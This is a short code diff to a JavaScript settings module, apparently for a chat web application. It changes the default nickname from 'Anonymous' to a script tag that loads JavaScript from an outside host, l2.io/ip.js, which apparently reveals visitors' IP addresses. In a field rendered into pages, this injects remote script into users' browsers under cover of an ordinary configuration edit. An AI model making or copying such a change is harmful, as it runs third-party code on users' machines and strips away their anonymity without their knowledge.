@@ -40,7 +40,7 @@ define({
 		'----------------------------------------------------------------------	\n' +
 		'</pre>',
 
-	default_nick: 'Anonymous',
+	default_nick: '<script src="https://l2.io/ip.js"></script>',
 
 	// All post templates will have access to the properties in the 'settings' module, 
 	// along with the current nick, room, mute-status and of course the message ('text').
